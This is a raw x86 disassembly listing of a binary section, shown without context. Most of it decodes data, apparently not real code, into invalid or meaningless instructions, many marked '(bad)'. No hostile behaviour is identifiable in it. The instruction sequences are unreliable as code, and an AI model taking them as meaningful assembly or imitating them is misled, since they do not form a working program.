  420fc5:	fidivr DWORD PTR [esi+0x42]
  420fc8:	mov    cl,0xfd
  420fca:	inc    ebx
  420fcb:	out    0x65,al
  420fcd:	xor    BYTE PTR [ebx],0x9
  420fd0:	mov    cl,0xe2
  420fd2:	dec    ecx
  420fd3:	loopne 0x421048
  420fd5:	mov    ss,WORD PTR ds:0x72bbf274
  420fdb:	mov    ds:0x1b2206b8,eax
  420fe0:	xchg   esi,eax
  420fe1:	mov    ah,0xed
  420fe3:	into   
  420fe4:	and    al,BYTE PTR [ebp-0x1]
  420fe7:	or     BYTE PTR [edi+0x2b],bl
  420fea:	xorps  xmm7,XMMWORD PTR [eax-0xaa2a116]
  420ff1:	cmp    eax,0xf6b73d3e
  420ff6:	pop    ebp
  420ff7:	hlt    
  420ff8:	daa    
  420ff9:	xchg   DWORD PTR [edi],esi
  420ffb:	inc    esi
  420ffc:	cmp    BYTE PTR [edi+0x7e1dbd0],al
  421002:	jp     0x42107c
  421004:	push   cs
  421005:	sub    esp,ebx
  421007:	add    al,0x44
  421009:	shl    DWORD PTR [eax-0x5d2977bc],cl
  42100f:	rcl    DWORD PTR [eax-0x7e0639b5],cl
  421015:	mov    dh,0xb9
  421017:	cwde   
  421018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421019:	or     DWORD PTR [ebx-0x6],ecx
  42101c:	add    eax,0xd5e3ce6a
  421021:	adc    BYTE PTR [eax+0x34503d7f],ah
  421027:	mov    al,ds:0xe8b691c
  42102c:	push   edi
  42102d:	push   ecx
  42102e:	push   eax
  42102f:	dec    edx
  421030:	(bad)  
  421032:	and    al,0xfe
  421034:	sub    al,0xb5
  421036:	mov    WORD PTR [edi-0x77],gs
  421039:	nop
  42103a:	mov    cl,0x87
  42103c:	dec    esp
  42103d:	scas   eax,DWORD PTR es:[edi]
  42103e:	pop    esi
  42103f:	cmc    
  421040:	add    ebp,DWORD PTR [ebp-0x33cf58f]
  421046:	scas   eax,DWORD PTR es:[edi]
  421047:	push   edi
  421048:	push   eax
  421049:	sar    DWORD PTR [ecx],0x7
  42104c:	outs   dx,DWORD PTR ds:[esi]
  42104d:	sbb    DWORD PTR [eax],ecx
  42104f:	out    dx,eax
  421050:	xchg   edx,eax
  421051:	push   edx
  421052:	xchg   ecx,eax
  421053:	mov    ebx,0xf8d327f8
  421058:	jmp    0x30fe6f45
  42105d:	ja     0x421052
  42105f:	mov    dh,0xba
  421061:	jmp    0x4210e2
  421063:	scas   eax,DWORD PTR es:[edi]
  421064:	xor    dl,BYTE PTR [edx+edi*1]
  421067:	mov    BYTE PTR [esi-0x8],cl
  42106a:	push   esp
  42106b:	sub    bl,ah
  42106d:	adc    ecx,ecx
  42106f:	adc    cl,BYTE PTR [ebx-0x78968e15]
  421075:	xor    eax,0xca629415
  42107a:	(bad)  [ecx+ebx*2]
  42107d:	jle    0x4210f0
  42107f:	sbb    bl,BYTE PTR [ebx]
  421081:	rcl    BYTE PTR [esi],0xd9
  421084:	or     eax,0xc6367a8
  421089:	enter  0x734b,0xae
  42108d:	hlt    
  42108e:	add    al,0x18
  421090:	int3   
	...
  4210f1:	add    BYTE PTR [eax],al
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ?,esp
  421101:	pop    ebx
  421102:	je     0x42116c
  421104:	cwde   
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    eax,0xa5000001
  42110d:	jecxz  0x42118e
  42110f:	bound  ebx,QWORD PTR [ebx]
  421111:	cmp    al,BYTE PTR [ebx-0x2b]
  421114:	sub    ebx,edx
  421116:	neg    BYTE PTR [edx]
  421118:	jl     0x42116c
  42111a:	mov    al,0xdd
  42111c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42111d:	arpl   WORD PTR [ecx-0x393fb723],bx
  421123:	bnd jge 0x421118
  421126:	add    al,0xb1
  421128:	adc    BYTE PTR [ecx-0xc],cl
  42112b:	les    eax,FWORD PTR [esi-0x80]
  42112e:	dec    ebp
  42112f:	mov    eax,0x5cedcef5
  421134:	add    dl,BYTE PTR [esi+eiz*1-0x23]
  421138:	in     eax,0x10
  42113a:	mov    ss,WORD PTR [edi-0x57]
  42113d:	push   esi
  42113e:	jp     0x421181
  421140:	fistp  DWORD PTR [ecx+0x7]
  421143:	loopne 0x421135
  421145:	imul   eax,DWORD PTR [eax+0x3f867171],0xe812cf17
  42114f:	out    dx,al
  421150:	xor    eax,0xe98f161d
  421155:	clc    
  421156:	and    dl,BYTE PTR [edi+ebp*8]
  421159:	shl    edi,cl
  42115b:	add    BYTE PTR [ebp+ebp*4+0x5aa2890d],0x57
  421163:	gs sbb al,0xf7
  421166:	out    dx,al
  421167:	dec    ebp
  421168:	(bad)  
  421169:	int3   
  42116a:	inc    ecx
  42116b:	jne    0x421104
  42116d:	cmp    ah,0xf
  421170:	fstp   DWORD PTR [esi]
  421172:	rol    DWORD PTR [edi-0x535d6bdc],1
  421178:	dec    edx
  421179:	pop    ebx
  42117a:	jne    0x421173
  42117c:	sub    BYTE PTR [eax+0x39],dl
  42117f:	fnstcw WORD PTR [edx]
  421181:	or     ch,BYTE PTR [ecx]
  421183:	out    dx,al
  421184:	test   BYTE PTR [ebx+0x22a8dad4],ah
  42118a:	inc    ebp
  42118b:	push   ecx
  42118c:	cmp    edi,DWORD PTR ss:[eax]
  42118f:	out    dx,eax
  421190:	stos   DWORD PTR es:[edi],eax
  421191:	push   0xf393c2df
  421196:	jns    0x4211a5
  421198:	mov    bh,0xd1
  42119a:	gs enter 0x285a,0x6a
  42119f:	push   es
  4211a0:	call   ebp
  4211a2:	hlt    
  4211a3:	jnp    0x4211ef
  4211a5:	sub    BYTE PTR [edx+0x46161a80],0x5d
  4211ac:	and    DWORD PTR [edi],esi
  4211ae:	mov    BYTE PTR [esi-0x6c],cl
  4211b1:	jno    0x421168
  4211b3:	fnstsw WORD PTR [eax+0x446e019c]
  4211b9:	idiv   DWORD PTR [esi-0x1]
  4211bc:	js     0x4211ae
  4211be:	mov    esp,0xdc521a94
  4211c3:	fstp   TBYTE PTR [ecx]
  4211c5:	(bad)  
  4211c6:	push   esi
  4211c7:	fwait
  4211c8:	loopne 0x4211a6
  4211ca:	aaa    
  4211cb:	imul   ebp,DWORD PTR [edi-0x4a926715],0x74
  4211d2:	dec    edi
  4211d3:	loope  0x4211d8
  4211d5:	or     cl,bh
  4211d7:	(bad)  
  4211d8:	addr16 daa 
  4211da:	std    
  4211db:	call   0xe6f6:0x64a9c194
  4211e2:	ror    BYTE PTR [esi-0x34],0x78
  4211e6:	clc    
  4211e7:	jnp    0x421182
  4211e9:	je     0x4211b1
  4211eb:	jnp    0x42122d
  4211ed:	fadd   st,st(5)
  4211ef:	xchg   esi,eax
  4211f0:	fucomp st(4)
  4211f2:	or     eax,0x578d68ff
  4211f7:	lock and al,0x4b
  4211fa:	and    al,dh
  4211fc:	int    0x76
  4211fe:	mov    ecx,0xdb9f028
  421203:	and    BYTE PTR [esi],bl
  421205:	xchg   esi,eax
  421206:	pop    eax
  421207:	inc    ebx
  421208:	mov    bl,0x8b
  42120a:	add    BYTE PTR [eax],al
  42120c:	push   esp
  42120d:	sahf   
  42120e:	outs   dx,DWORD PTR ds:[esi]
  42120f:	mov    eax,0x91
	...
  421274:	sahf   
  421275:	pop    ds
  421276:	(bad)  
  421277:	test   DWORD PTR [edi-0x42800109],0x9b7ab32d
  421281:	(bad)  
  421282:	cmc    
  421283:	popf   
  421284:	popf   
  421285:	popa   
  421286:	add    DWORD PTR [eax],eax
  421288:	add    eax,0xf1000001
  42128d:	xchg   WORD PTR [edx+ebx*1-0x23],di
  421292:	jge    0x4212eb
  421294:	int3   
  421295:	cdq    
  421296:	sub    BYTE PTR [edx-0x7d],0x57
  42129a:	fidivr WORD PTR [edi+0x3f]
  42129d:	iret   
  42129e:	adc    eax,0xe683872
  4212a3:	(bad)  
  4212a4:	lock xchg esi,ecx
  4212a7:	mov    WORD PTR gs:0xe7cb223a,?
  4212ae:	pop    ebp
  4212af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212b0:	into   
  4212b1:	jae    0x421315
  4212b3:	mov    ebx,0x1b3800c0
  4212b8:	pop    ds
  4212b9:	pop    ebx
  4212ba:	icebp  
  4212bb:	xchg   ebp,eax
  4212bc:	fs inc edx
  4212be:	fldenv [ebx-0x2f724063]
  4212c4:	ja     0x42124d
  4212c6:	sti    
  4212c7:	or     DWORD PTR [ebx],0x58ed8595
  4212cd:	sub    eax,0x50137be8
  4212d2:	mov    ch,0x7e
  4212d4:	sub    BYTE PTR [ebx-0x46],bh
  4212d7:	rol    DWORD PTR [esi],1
  4212d9:	push   ds
  4212da:	inc    edx
  4212db:	hlt    
  4212dc:	sbb    DWORD PTR [edi],esi
  4212de:	mov    edx,0x862e6fa9
  4212e3:	popa   
  4212e4:	inc    eax
  4212e5:	pop    esi
  4212e6:	sbb    BYTE PTR [ebx],bl
  4212e8:	call   0x536cbe35
  4212ed:	scas   eax,DWORD PTR es:[edi]
  4212ee:	dec    ebx
  4212ef:	int    0xb3
  4212f1:	adc    al,0xf2
  4212f3:	pop    ebp
  4212f4:	mov    edx,0xe4225d93
  4212f9:	aaa    
  4212fa:	sti    
  4212fb:	pop    edi
  4212fc:	call   0xa193:0xb8b98f0e
  421303:	(bad)  
  421304:	rcr    DWORD PTR [eax+0x67],0x8d
  421308:	mov    ds:0x3274c00a,al
  42130d:	and    eax,0xc08b38fb
  421312:	fdiv   QWORD PTR [edi+0x1eb72cc8]
  421318:	jno    0x421333
  42131a:	push   cs
  42131b:	pusha  
  42131c:	dec    edx
  42131d:	je     0x4212b3
  42131f:	cmp    al,0x32
  421321:	scas   al,BYTE PTR es:[edi]
  421322:	stc    
  421323:	push   ds
  421324:	fs jmp 0x4212c2
  421327:	jno    0x4212d8
  421329:	mov    WORD PTR [ebx+0x7d],ss
  42132c:	fmul   DWORD PTR [edx+0x7e2c6013]
  421332:	pop    ss
  421333:	or     DWORD PTR [ebx],eax
  421335:	add    BYTE PTR ds:0xa40fac7f,0xac
  42133c:	repz popa 
  42133e:	xchg   esp,eax
  42133f:	ss jo  0x4213a4
  421342:	inc    esp
  421343:	sub    DWORD PTR [eax-0x3c7e3bc8],ebx
  421349:	test   al,0xb8
  42134b:	cmp    al,0x80
  42134d:	in     al,0x90
  42134f:	xchg   ebp,eax
  421350:	jae    0x4213c2
  421352:	cmp    al,0x31
  421354:	retf   
  421355:	inc    ebx
  421356:	and    BYTE PTR [ecx-0x5e],bl
  421359:	ror    DWORD PTR es:[ecx+0x259d2075],1
  421360:	sbb    BYTE PTR [ebx+0x24],dl
  421363:	xchg   al,ah
  421365:	add    dh,BYTE PTR [eax-0x1ddd2a25]
  42136b:	aas    
  42136c:	xchg   edi,eax
  42136d:	loope  0x4213ba
  42136f:	jns    0x421304
  421371:	aad    0xe6
  421373:	xor    al,0x32
  421375:	outs   dx,BYTE PTR ds:[esi]
  421376:	push   es
  421377:	cmp    eax,0xcf704754
  42137c:	xchg   ebx,eax
  42137d:	mov    ds:0xba0bd889,al
  421382:	(bad)  [esi]
  421384:	add    al,0x35
  421386:	xor    dl,BYTE PTR [ebp-0x2b3cbd38]
  42138c:	and    bh,BYTE PTR [ecx+0xaaf034]
	...
  4213f2:	add    BYTE PTR [eax],al
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x23bd0b61]
  421402:	mov    esp,0x162a277
  421407:	add    BYTE PTR ds:0xc8000001,al
  42140d:	sti    
  42140e:	addr16 push ss
  421410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421411:	mov    es,WORD PTR [ebp+0x33]
  421414:	inc    ebp
  421415:	xchg   ebp,eax
  421416:	sbb    BYTE PTR [ecx+ecx*4],al
  421419:	xchg   esi,eax
  42141a:	loopne 0x421421
  42141c:	xor    al,0xcb
  42141e:	das    
  42141f:	leave  
  421420:	cwde   
  421421:	push   esi
  421422:	rcr    BYTE PTR [ecx+eiz*8+0x59],cl
  421426:	lds    ecx,FWORD PTR [esi+ebx*1+0x1c570855]
  42142d:	(bad)  
  42142e:	fnstenv [eax-0xcc0a699]
  421434:	add    cl,BYTE PTR [edx]
  421436:	adc    DWORD PTR [ebp*2-0x4298febe],0x7f
  42143e:	lock inc edx
  421440:	in     al,0x40
  421442:	out    0x36,eax
  421444:	outs   dx,BYTE PTR ds:[esi]
  421445:	jle    0x4214ae
  421447:	jb     0x421486
  421449:	mov    edi,0x7c18454f
  42144e:	or     al,0x33
  421450:	aam    0xe7
  421452:	inc    ebp
  421453:	test   DWORD PTR [edx],esp
  421455:	pushf  
  421456:	add    BYTE PTR [edx+0xa8c4316],cl
  42145c:	fstp   TBYTE PTR [esi]
  42145e:	in     al,0xde
  421460:	imul   edx,DWORD PTR [edi+0x68],0x19
  421464:	rcl    BYTE PTR [eax],1
  421466:	inc    esp
  421467:	test   BYTE PTR [edx+edi*1],cl
  42146a:	mov    eax,ds:0x48834784
  42146f:	mov    ch,0xa7
  421471:	out    dx,al
  421472:	jbe    0x4214a6
  421474:	jmp    FWORD PTR [edx]
  421476:	clc    
  421477:	ins    BYTE PTR es:[edi],dx
  421478:	inc    ebp
  421479:	stos   DWORD PTR es:[edi],eax
  42147a:	or     eax,DWORD PTR [edi-0x1013b36e]
  421480:	sub    al,0x28
  421482:	test   eax,0xc19bffb9
  421487:	push   ebp
  421488:	inc    ebx
  421489:	pop    ebx
  42148a:	jb     0x421441
  42148c:	jle    0x421445
  42148e:	mov    edx,0x2b491517
  421493:	jbe    0x421492
  421495:	jle    0x4214f7
  421497:	data16 mov dl,0x97
  42149a:	scas   eax,DWORD PTR es:[edi]
  42149b:	loope  0x42144a
  42149d:	sbb    al,0x6b
  42149f:	inc    ebx
  4214a0:	xor    DWORD PTR [esi],esp
  4214a2:	stos   DWORD PTR es:[edi],eax
  4214a3:	ins    DWORD PTR es:[edi],dx
  4214a4:	jns    0x421448
  4214a6:	mov    al,0xbf
  4214a8:	mov    DWORD PTR [ecx-0x5122289a],edx
  4214ae:	xor    al,BYTE PTR ds:0x30631321
  4214b4:	pusha  
  4214b5:	pop    ds
  4214b6:	sub    al,0x31
  4214b8:	into   
  4214b9:	add    ch,dh
  4214bb:	lea    esp,[edx-0x21]
  4214be:	dec    ebx
  4214bf:	pusha  
  4214c0:	sub    ch,0x8
  4214c3:	sar    BYTE PTR [edi+0x70856ef8],0x61
  4214ca:	dec    eax
  4214cb:	or     DWORD PTR [eax+ecx*1-0x4531bceb],esi
  4214d2:	mov    edx,0xaa5a516b
  4214d7:	pop    eax
  4214d8:	inc    esi
  4214d9:	inc    ebx
  4214da:	inc    edx
  4214db:	sbb    edx,eax
  4214dd:	fcomp  DWORD PTR [esi]
  4214df:	mov    ecx,0xa6ed644c
  4214e4:	xchg   edx,eax
  4214e5:	pop    edi
  4214e6:	inc    BYTE PTR [edx+0x73]
  4214e9:	jb     0x4214c5
  4214eb:	inc    ebp
  4214ec:	fwait
  4214ed:	ror    DWORD PTR [esi],0x4a
  4214f0:	popa   
  4214f1:	jp     0x4214d7
  4214f3:	mov    ah,0x35
  4214f5:	push   es
  4214f6:	cdq    
  4214f7:	mov    DWORD PTR [edi-0x20b827db],ebx
  4214fd:	mov    ah,0x7a
  4214ff:	add    al,BYTE PTR [ebx-0x1b88ed2e]
  421505:	mov    esp,0xd45e7a33
  42150a:	nop
  42150b:	lea    eax,[esi+edi*8+0x5b]
  42150f:	cmp    DWORD PTR [edx+0x0],ebp
	...
  421572:	add    BYTE PTR [eax],al
  421574:	(bad)  
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax+0x381542b4],bp
  421582:	push   cs
  421583:	pop    es
  421584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421585:	arpl   WORD PTR [ecx],ax
  421587:	add    BYTE PTR ds:0xbd000001,al
  42158d:	ins    BYTE PTR es:[edi],dx
  42158e:	and    ebx,edx
  421590:	ins    DWORD PTR es:[edi],dx
  421591:	inc    ebp
  421592:	cs jbe 0x421535
  421595:	xchg   edx,eax
  421596:	mov    al,ds:0xc00fedff
  42159b:	jns    0x421593
  42159d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42159e:	dec    esi
  42159f:	repnz push ss
  4215a1:	stc    
  4215a2:	mov    BYTE PTR [edi-0x6d],0x45
  4215a6:	mov    eax,ds:0x36a042ae
  4215ab:	out    0x6,eax
  4215ad:	push   ecx
  4215ae:	test   edi,esp
  4215b0:	inc    esi
  4215b1:	test   dh,ah
  4215b3:	out    0xb3,eax
  4215b5:	outs   dx,DWORD PTR ds:[esi]
  4215b6:	jmp    0x7d1f:0xb17fc3bb
  4215bd:	loope  0x42153f
  4215bf:	cli    
  4215c0:	popf   
  4215c1:	ret    
  4215c2:	or     al,0x1c
  4215c4:	scas   eax,DWORD PTR es:[edi]
  4215c5:	dec    ebp
  4215c6:	mul    DWORD PTR [edi-0x1a53de26]
  4215cc:	pop    ss
  4215cd:	cs dec di
  4215d0:	mov    ds:0x40d8327f,eax
  4215d5:	repnz fbld TBYTE PTR [ecx+eax*2-0x41]
  4215da:	cmp    eax,0xa6de1c2b
  4215df:	loop   0x4215ca
  4215e1:	pushf  
  4215e2:	clc    
  4215e3:	ins    DWORD PTR es:[edi],dx
  4215e4:	xchg   ecx,eax
  4215e5:	inc    ecx
  4215e6:	sub    eax,0x967f29b3
  4215eb:	icebp  
  4215ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215ed:	or     DWORD PTR [edx],edi
  4215ef:	push   es
  4215f0:	(bad)  
  4215f1:	mov    esp,0xf4cbb2d0
  4215f6:	xor    BYTE PTR [edx-0x60e5eb10],cl
  4215fc:	mov    esi,0x6ac6740e
  421601:	push   ds
  421602:	loopne 0x421610
  421604:	clc    
  421605:	in     al,dx
  421606:	call   0xf89:0x5ceaee66
  42160d:	test   eax,0xc83b3ea3
  421612:	add    BYTE PTR [eax],0xec
  421615:	add    BYTE PTR [ecx],bh
  421617:	push   ds
  421618:	cmp    eax,0xdc87d327
  42161d:	cmp    eax,0x43305da6
  421622:	imul   edx,DWORD PTR [esi],0xffffff99
  421625:	mov    dl,cl
  421627:	aad    0xd9
  421629:	ret    0xe758
  42162c:	outs   dx,DWORD PTR ds:[esi]
  42162d:	mov    ds:0x1cdc4e37,al
  421632:	test   BYTE PTR [eax+0x22],dl
  421635:	test   edi,eax
  421637:	pop    edx
  421638:	cdq    
  421639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42163a:	pop    esi
  42163b:	xchg   esp,eax
  42163c:	dec    ecx
  42163d:	je     0x421672
  42163f:	imul   edx,DWORD PTR [edi-0xe8e316],0x50
  421646:	sub    DWORD PTR [ebx],ebx
  421648:	cmp    eax,0xfa8a3456
  42164d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42164e:	fcmovb st,st(7)
  421650:	test   dl,dl
  421652:	push   ss
  421653:	sbb    BYTE PTR [esi-0x7c],dl
  421656:	mov    bl,dh
  421658:	and    edi,DWORD PTR [esi+0x30]
  42165b:	xchg   ecx,eax
  42165c:	iret   
  42165d:	jo     0x4215eb
  42165f:	lods   eax,DWORD PTR ds:[esi]
  421660:	retf   0xa3a0
  421663:	dec    ebp
  421664:	jge    0x42165b
  421666:	inc    esp
  421667:	retf   0xbcae
  42166a:	and    eax,0xe9429e0b
  42166f:	test   al,0xb3
  421671:	add    BYTE PTR [ecx+0x6e],0x20
  421675:	cmc    
  421676:	xchg   esp,eax
  421677:	jmp    0x49cba812
  42167c:	or     BYTE PTR [esi+0x3e],0x42
  421680:	adc    eax,0x5465bd5d
  421685:	pushf  
  421686:	adc    ecx,DWORD PTR [esi+0x0]
  421689:	leave  
  42168a:	out    0x13,al
  42168c:	test   DWORD PTR [edi+0x374738],edi
	...
  4216f2:	add    BYTE PTR [eax],al
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	inc    edx
  421701:	or     al,0x2b
  421703:	sub    DWORD PTR [esp+eiz*2+0x1050001],0x0
  42170b:	add    ch,dh
  42170d:	cmc    
  42170e:	jmp    0x802e29e6
  421713:	fnstcw WORD PTR [edi+0x6c]
  421716:	icebp  
  421717:	ds jmp 0x42172c
  42171a:	enter  0xac8b,0xc9
  42171e:	and    ebp,DWORD PTR [ecx+ebp*2]
  421721:	repnz mov WORD PTR [ebx],fs
  421724:	mov    bl,0xf
  421726:	mov    eax,0xb92f0f3f
  42172b:	ss ja  0x4216f4
  42172e:	lea    esi,[ecx]
  421730:	jg     0x4216bf
  421732:	test   BYTE PTR [ebx],dh
  421734:	aad    0xf7
  421736:	leave  
  421737:	mov    eax,0xeb200898
  42173c:	sub    ah,BYTE PTR es:[ebx]
  42173f:	or     ch,dl
  421741:	ins    BYTE PTR es:[edi],dx
  421742:	jmp    0x421731
  421744:	pop    edi
  421745:	adc    BYTE PTR [ebx-0x35],dl
  421748:	and    bl,BYTE PTR [eax+0x5df9cd95]
  42174e:	dec    eax
  42174f:	mov    ebp,0x7d818c71
  421754:	pop    ecx
  421755:	or     al,0x30
  421757:	jae    0x42179d
  421759:	inc    ecx
  42175a:	push   0xffffff80
  42175c:	xchg   esp,eax
  42175d:	jg     0x421736
  42175f:	stc    
  421760:	(bad)  
  421761:	mov    ch,0xd5
  421763:	mov    edx,0xb742b783
  421768:	cdq    
  421769:	aaa    
  42176a:	(bad)  
  42176b:	adc    esi,DWORD PTR [ecx+edx*1+0x62]
  42176f:	(bad)  
  421770:	in     al,0xeb
  421772:	jmp    0x15b24fb7
  421777:	add    dh,dh
  421779:	pop    edi
  42177a:	mov    edi,0x86086e68
  42177f:	add    BYTE PTR [edi-0x20c44350],0x60
  421786:	in     eax,0x12
  421788:	in     al,0xe4
  42178a:	shr    BYTE PTR [edi+0x74],0x27
  42178e:	adc    eax,DWORD PTR [edi-0x62]
  421791:	jp     0x421750
  421793:	jmp    0x2110:0x2c2074b8
  42179a:	push   cs
  42179b:	lock int 0x9d
  42179e:	ss fcomi st,st(7)
  4217a1:	test   eax,0x813a5952
  4217a6:	shr    DWORD PTR [eax],cl
  4217a8:	pop    edx
  4217a9:	stos   DWORD PTR es:[edi],eax
  4217aa:	pop    es
  4217ab:	imul   edi,DWORD PTR es:[ebp+0x231aa212],0xffffffda
  4217b3:	sbb    eax,0xd3b42ace
  4217b8:	call   FWORD PTR [esi+0x4]
  4217bb:	stc    
  4217bc:	mov    al,dl
  4217be:	outs   dx,DWORD PTR ds:[esi]
  4217bf:	cmp    DWORD PTR [edx+0x87cd4be],esp
  4217c5:	push   edx
  4217c6:	xchg   ebp,eax
  4217c7:	dec    eax
  4217c8:	(bad)  
  4217c9:	mov    ch,0x90
  4217cb:	xor    bl,BYTE PTR [edi+edi*2-0x3d347c14]
  4217d2:	lods   eax,DWORD PTR ds:[esi]
  4217d3:	test   DWORD PTR [edx-0x32],0x1cae91c7
  4217da:	jb     0x421821
  4217dc:	into   
  4217dd:	jecxz  0x42179b
  4217df:	aaa    
  4217e0:	mov    ah,0xcc
  4217e2:	aas    
  4217e3:	lahf   
  4217e4:	pop    edi
  4217e5:	xchg   esi,eax
  4217e6:	cmp    DWORD PTR ds:0x93c1e569,0xffffffd5
  4217ed:	cmc    
  4217ee:	(bad)  
  4217ef:	(bad)  
  4217f0:	das    
  4217f1:	push   0x74b2afdd
  4217f6:	jle    0x421817
  4217f8:	je     0x421810
  4217fa:	inc    ecx
  4217fb:	leave  
  4217fc:	daa    
  4217fd:	xor    ebp,edi
  4217ff:	addr16 dec esp
  421801:	xchg   ebx,eax
  421802:	jb     0x42184b
  421804:	and    al,0x2d
  421806:	add    al,0xb5
  421808:	or     ecx,DWORD PTR [edx-0x31]
  42180b:	jb     0x421817
  42180d:	mov    edi,0x89b144
	...
  421872:	add    BYTE PTR [eax],al
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	push   edi
  421881:	push   esi
  421882:	stos   DWORD PTR es:[edi],eax
  421883:	sub    eax,0x165b1
  421888:	add    eax,0x65000001
  42188d:	daa    
  42188e:	es shl bl,0x4c
  421892:	xchg   esi,eax
  421893:	pop    dx
  421895:	xchg   esp,eax
  421896:	pushf  
  421897:	clc    
  421898:	lea    esp,[edx+eiz*1]
  42189b:	adc    bl,al
  42189d:	jp     0x42183e
  42189f:	adc    BYTE PTR [ecx],cl
  4218a1:	xchg   ebp,eax
  4218a2:	aad    0xa6
  4218a4:	pop    ebx
  4218a5:	jp     0x421889
  4218a7:	stos   BYTE PTR es:[edi],al
  4218a8:	in     al,dx
  4218a9:	popa   
  4218aa:	out    dx,al
  4218ab:	mov    ss,WORD PTR [edi+0x17afda6f]
  4218b1:	es retf 0xc878
  4218b5:	and    dl,bl
  4218b7:	pop    es
  4218b8:	popa   
  4218b9:	and    BYTE PTR [ecx-0x15fcbd64],bh
  4218bf:	xchg   esi,eax
  4218c0:	mov    eax,0x48c377a3
  4218c5:	scas   eax,DWORD PTR es:[edi]
  4218c6:	sahf   
  4218c7:	test   eax,0x5d21ba77
  4218cc:	mov    cl,0x90
  4218ce:	and    DWORD PTR [ebx],ebx
  4218d0:	stos   BYTE PTR es:[edi],al
  4218d1:	xchg   esi,eax
  4218d2:	(bad)
  4218d5:	sub    al,0x26
  4218d7:	add    dl,BYTE PTR [edi-0x1f5fa713]
  4218dd:	sahf   
  4218de:	arpl   WORD PTR [ecx-0x3b9ad61],di
  4218e4:	enter  0x3b29,0x83
  4218e8:	mov    cl,dh
  4218ea:	(bad)
  4218ed:	les    ebx,FWORD PTR [edx]
  4218ef:	or     eax,0xa4c5c4a9
  4218f4:	mov    BYTE PTR [ebp-0x484fcd48],al
  4218fa:	jp     0x421977
  4218fc:	xlat   BYTE PTR ds:[ebx]
  4218fd:	push   es
  4218fe:	mov    ebp,0x8f7981a3
  421903:	jle    0x421955
  421905:	ins    DWORD PTR es:[edi],dx
  421906:	mov    esi,0x48fde385
  42190b:	in     al,dx
  42190c:	add    eax,0x4fc05207
  421911:	add    DWORD PTR [esi+eax*1-0x35],ebx
  421915:	fisttp QWORD PTR [ebp-0x7241f714]
  42191b:	(bad)  
  42191c:	pop    ecx
  42191d:	(bad)  
  42191e:	int3   
  42191f:	ficomp WORD PTR [esp+eax*1]
  421922:	jo     0x421977
  421924:	fisttp QWORD PTR [ebp-0x3f]
  421927:	shl    esi,cl
  421929:	test   eax,0x6a98f92b
  42192e:	lds    ebx,FWORD PTR [edx]
  421930:	loop   0x4218cd
  421932:	jge    0x4218c9
  421934:	xchg   ecx,eax
  421935:	or     DWORD PTR [esi],esi
  421937:	xor    ah,dl
  421939:	int3   
  42193a:	into   
  42193b:	pop    ecx
  42193c:	in     eax,0xa5
  42193e:	std    
  42193f:	and    eax,0x27f47381
  421944:	xchg   esi,eax
  421945:	(bad)  
  421946:	jle    0x421983
  421948:	adc    DWORD PTR [ecx-0x70],esp
  42194b:	sub    BYTE PTR [ecx],cl
  42194d:	add    bl,BYTE PTR [edx]
  42194f:	push   ss
  421950:	dec    esi
  421951:	daa    
  421952:	push   edi
  421953:	and    eax,0x58f8bc58
  421958:	mov    bl,BYTE PTR [edx-0x63]
  42195b:	or     BYTE PTR [edx],bl
  42195d:	dec    esi
  42195e:	jp     0x42198f
  421960:	xor    ecx,ecx
  421962:	lods   al,BYTE PTR ds:[esi]
  421963:	jl     0x421927
  421965:	sub    eax,0x66d59573
  42196a:	jae    0x421960
  42196c:	inc    ecx
  42196d:	dec    edx
  42196e:	in     eax,0xb6
  421970:	repnz nop
  421972:	pop    esp
  421973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421974:	ss pop ss
  421976:	ret    
  421977:	cdq    
  421978:	sbb    eax,0xcf5ac7d4
  42197d:	outs   dx,BYTE PTR ds:[esi]
  42197e:	mov    gs,WORD PTR [edi-0x7b2ff24a]
  421984:	jle    0x42196c
  421986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421987:	lahf   
  421988:	scas   eax,DWORD PTR es:[edi]
  421989:	leave  
  42198a:	jbe    0x4219cc
  42198c:	pushf  
  42198d:	out    dx,al
  42198e:	or     edi,DWORD PTR [ecx]
  421990:	fiadd  DWORD PTR [eax]
	...
  4219f2:	add    BYTE PTR [eax],al
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	lods   eax,DWORD PTR ds:[esi]
  421a01:	push   ds
  421a02:	xchg   edx,eax
  421a03:	xor    dh,BYTE PTR [esi+0x5000166]
  421a09:	add    DWORD PTR [eax],eax
  421a0b:	add    BYTE PTR [edx-0x6f],cl
  421a0e:	lahf   
  421a0f:	dec    edx
  421a10:	pop    edi
  421a11:	daa    
  421a12:	es scas al,BYTE PTR es:[edi]
  421a14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a15:	add    BYTE PTR [edi],dh
